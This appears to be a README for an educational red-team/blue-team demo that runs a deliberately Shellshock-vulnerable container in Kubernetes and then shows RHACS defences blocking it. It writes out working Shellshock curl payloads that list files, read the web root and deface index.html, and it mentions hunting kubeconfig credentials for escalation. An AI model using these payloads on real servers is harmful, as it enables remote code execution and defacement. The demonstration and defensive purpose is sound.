# Insecure Deployment Demo

This repo is intended to host insecure deployments for educational and demo purposes. These should never be run in privileged mode and should avoid use on public networks.

This deployment is based off of public projects such as the Damn Vulerable Web Application and is intended to be used to demo the shellshock exploit in a Kubernetes environment. Its reccomended to use port forwarding to ensure this is not exposed.

Containerization as a movement has isolated this attack surface.

# Security is about defense in depth.

## Lets attack by peeling back the layers of the onion.

### Layer 1
- Red Team: Application is the outter most layer because these are exposed. 
- Blue Team: Layer one defense - application vulerablility management and dependency management.

### Layer 2
- Red Team: Then lets own the operating system through privledge escalation
- Blue Team: Layer 2 defense - logging & alerting/blocking procceses/hardening/minimizing privledges

### Layer 3
- Red Team: Lets laterally move through the environment get a backdoor and action on objective. 
- Blue Team: Admission controls & backdoor container monitoring.

# Layer 1

## What is shellshock

Improper input validation bash code allowed users to put trailing commands after the definition of environment variables. 

You read this and first think - what uses environment variables.....crap. TONS OF THINGS! SSH, Apache modules, etc.

This meant remote code execution on apaches mod_cgi(d) library used in web servers.

CGI stands for Common Gateway Interface. It is a way to let Apache execute script files and send the
output to the client. So we just need something that will use bash.

# Demo Script

*Note: It's important that this is not exposed to the public internet and highly reccomended to never be run in privlegded mode. (You will actually be hacked if running in privledged mode and publically expose this)* It's reccomended that when using this you only port forward.

## Setup

1. Run shellshock vulerable pod

oc run shellshock --labels=app=shellshock,team=evilcasper --image=vulnerables/cve-2014-6271 -n default

2. Port forward to the pod.

oc port-forward shellshock 8080:80 -n default

## Layer 1: Reconnisance, 

3. Check out the server to do basic reconnisance - by looking at the request headers in the network view of the developer tab. Then check exploitdb.

You want to know more about the application.

Check server headers.

Its obviously vulerable to shellshock and has given us the endpoint. This is convient. 

### Weaponization and delivery

Making it easy for them to find me - the user agent is removed - which is totally normal network traffic :P

Have to make it hard for the copy pasta script kiddies. Also you're never gonna get a website with vulerable as an endpoint.

curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'ls /'" \
http://localhost:8080/cgi-bin/vulnerable

4. Check out the index file for apache

curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /var/www/index.html'" \
http://localhost:8080/cgi-bin/vulnerable

### Exploitation

6. Time to mess with people

curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo \"<html><body><h1>I like cat memes - also you should protect your stuff</h1><body><img src=https://miro.medium.com/max/1200/1*7_m4dF9OqBjePqqRyJ1O-g.jpeg></body></html>\" > /var/www/index.html'" http://localhost:8080/cgi-bin/vulnerable

### Blue team


7. Turn on security controls for proccess baselining

Turn on proccess baselining


curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /var/www/index.html'" \
http://localhost:8090/cgi-bin/vulnerable


Observe how me messing with people is blocked and the pod is killed. We're protected by our container isolation and RHACS.

But seriously we own this operating system. Next I need to break out of the container. If the container is privledged this is a peice of cake. Unfortunately this isn't but next I'm looking for some kubeconfigs (credentials to Kubernetes API on the Operating system protected by access controls) to begin privledge escalation. 

Lets assume we got unlucky and this was found now what. We need to mitigate this. 

## Exec into the pod

8. Redeploy shellshock

kubectl run shellshock --labels=app=shellshock,team=evilcasper --image=vulnerables/cve-2014-6271 -n default

oc exec -it shellshock -n default -- bash

10. Observe violation - and then turn policy to blocking mode - now observe this being blocked.

oc exec -it shellshock -n default -- bash

Label can be used to implement exceptions and monitor.


So we're able to stop users with access to the Kube API from being able to access our containers and implement proccesses to allow access for troubleshooting. Containers are supposed to be ephemeral.


## Minimalist containers and risk prioritization

1. Discuss risk prioritization in RHACS

Example: Want to block any high or critical vulerability thats externally facing, or a crown jewel.

Discuss risk



